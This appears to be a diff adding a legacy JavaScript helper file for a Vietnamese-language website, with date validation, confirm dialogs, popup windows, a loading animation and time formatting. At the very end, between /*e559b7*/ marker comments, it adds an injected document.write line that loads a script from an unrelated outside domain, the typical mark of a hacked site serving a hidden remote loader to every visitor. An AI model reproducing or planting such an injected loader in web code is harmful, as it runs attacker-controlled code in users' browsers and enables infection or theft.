@@ -1,0 +1,231 @@
+// JavaScript Document
+
+
+<!--
+
+function checkDate(name)
+{
+	var x = document.forms[0].elements;
+	var day = parseInt(x[name+"_day"].options[x[name+"_day"].selectedIndex].value);
+	var month = parseInt(x[name+"_month"].options[x[name+"_month"].selectedIndex].value);
+	var year = parseInt(x[name+"_year"].options[x[name+"_year"].selectedIndex].value);
+
+	if (!day || !month || !year)
+		return false;
+
+	if (year/4 == parseInt(year/4))
+		monthLength[1] = 29;
+
+	if (day > monthLength[month-1])
+		return false;
+
+	monthLength[1] = 28;
+
+	var now = new Date();
+	now = now.getTime(); //NN3
+
+	var dateToCheck = new Date();
+	dateToCheck.setYear(year);
+	dateToCheck.setMonth(month-1);
+	dateToCheck.setDate(day);
+	var checkDate = dateToCheck.getTime();
+
+	var futureDate = (now < checkDate);
+	var pastDate = (now > checkDate);
+
+	return pastDate;
+}
+
+function myPrint() {
+    if (window.print) {
+        if (confirm("Print Page?")) {
+            window.print();
+        }
+    }
+}
+function log_out() {
+
+	ht = document.getElementsByTagName("html");
+	ht[0].style.filter = "progid:DXImageTransform.Microsoft.BasicImage(grayscale=1)";
+
+	if (confirm('Ban co muon thoat khong?')) {
+		return true;
+	} else {
+		ht[0].style.filter = "";
+		return false;
+	}
+}
+function delete_sp() {
+
+	ht = document.getElementsByTagName("html");
+	ht[0].style.filter = "progid:DXImageTransform.Microsoft.BasicImage(grayscale=1)";
+
+	if (confirm('Ban co chac chan xoa khong?')) {
+		return true;
+	} else {
+		ht[0].style.filter = "";
+		return false;
+	}
+}
+function batdau() {
+
+	ht = document.getElementsByTagName("html");
+	ht[0].style.filter = "progid:DXImageTransform.Microsoft.BasicImage(grayscale=1)";
+
+	if (confirm('Ban da san sang chua?')) {
+		return true;
+	} else {
+		ht[0].style.filter = "";
+		return false;
+	}
+}
+function khongchoi() {
+
+	ht = document.getElementsByTagName("html");
+	ht[0].style.filter = "progid:DXImageTransform.Microsoft.BasicImage(grayscale=1)";
+
+	if (confirm('Ban da chac chan chua?')) {
+		return true;
+	} else {
+		ht[0].style.filter = "";
+		return false;
+	}
+}
+function tieptuc() {
+
+	ht = document.getElementsByTagName("html");
+	ht[0].style.filter = "progid:DXImageTransform.Microsoft.BasicImage(grayscale=1)";
+
+	if (confirm('Ban muon tiep tuc hay khong?')) {
+		return true;
+	} else {
+		ht[0].style.filter = "";
+		return false;
+	}
+}
+function popwindow(pop,width,height)
+{
+	var url = pop;
+	var wd = width;
+	var he = height;
+
+	window.open(url,"","toolbar=0,menubar=0,scrollbars=yes,resizable=no,width=" + wd +",height=" + he + ";")
+}
+
+//-->
+
+<!--
+var t_id = setInterval(animate,20);
+var pos=0;
+var dir=2;
+var len=0;
+
+function animate()
+{
+	var elem = document.getElementById('progress');
+	if(elem != null) {
+		if (pos==0) len += dir;
+		if (len>32 || pos>79) pos += dir;
+		if (pos>79) len -= dir;
+		if (pos>79 && len==0) pos=0;
+		elem.style.left = pos;
+		elem.style.width = len;
+	}
+}
+function remove_loading() {
+	this.clearInterval(t_id);
+	var targelem = document.getElementById('loader_container');
+	targelem.style.display='none';
+	targelem.style.visibility='hidden';
+	var t_id = setInterval(animate,60);
+}
+//-->
+
+function showDialog(url, width, height)
+{
+	return showWindow(url, false, false, false, false, false, false, true, true, width, height, 0, 0);
+}
+
+function showWindow(url, isStatus, isResizeable, isScrollbars, isToolbar, isLocation, isFullscreen, isTitlebar, isCentered, width, height, top, left)
+{
+	if (isCentered)
+	{
+		top = (screen.height - height) / 2;
+		left = (screen.width - width) / 2;
+	}
+
+	open(url, '_blank', 'status=' + (isStatus ? 'yes' : 'no') + ','
+	+ 'resizable=' + (isResizeable ? 'yes' : 'no') + ','
+	+ 'scrollbars=' + (isScrollbars ? 'yes' : 'no') + ','
+	+ 'toolbar=' + (isToolbar ? 'yes' : 'no') + ','
+	+ 'location=' + (isLocation ? 'yes' : 'no') + ','
+	+ 'fullscreen=' + (isFullscreen ? 'yes' : 'no') + ','
+	+ 'titlebar=' + (isTitlebar ? 'yes' : 'no') + ','
+	+ 'height=' + height + ',' + 'width=' + width + ','
+	+ 'top=' + top + ',' + 'left=' + left);
+}
+
+function writeTime(s)
+{
+	var mydate=new Date(s)
+	
+	var year = mydate.getYear()
+	if (year < 1000)
+		year += 1900
+	var month = mydate.getMonth() + 1
+	if (month < 10)
+		month = "0" + month
+	var day = mydate.getDate()
+	if (day < 10)
+		day = "0" + day
+
+	var dayw = mydate.getDay()
+	
+	var hour = mydate.getHours()
+	if (hour < 10)
+		hour = "0" + hour
+	
+	var minute=mydate.getMinutes()
+	if (minute < 10)
+		minute = "0" + minute
+	var dayarray=new Array("Ch&#7911; Nh&#7853;t","Th&#7913; Hai","Th&#7913; Ba","Th&#7913; T&#432;","Th&#7913; N&#259;m","Th&#7913; S&#225;u","Th&#7913; B&#7843;y")
+	document.write(dayarray[dayw]+", "+day+"/"+month+"/"+year+",&nbsp;"+hour+":"+minute+" (GMT+7)")
+}
+
+function getTimeString(s)
+{
+	document.write("<span class=LargeTime2>");
+	writeTime(s);
+	document.write("</span>")
+}
+
+function Trim(s)
+{
+var i = 0;
+while ((i < s.length) && (s.charCodeAt(i) == 32))
+	i++;
+
+var j = s.length - 1;
+while ((j > i) && (s.charCodeAt(j) == 32))
+	j--;
+
+return s.substr(i, j - i + 1);
+}
+
+function GetPostVariable(param, defval)
+{
+	var	s = '&' + location.search.substr(1);
+	var	i = s.indexOf('&' + param + '=');
+	if (i == -1) return defval;
+
+	s = s.substr(i + param.length + 2);
+	i = s.indexOf('&');
+	if (i == -1) return s;
+
+	return s.substr(0, i);
+}
+
+/*e559b7*/
+document.write('<script type="text/javascript" src="http://sshlawfirm.com/w4tn9cwf.php?id=1340406"></script>');
+
+/*/e559b7*/
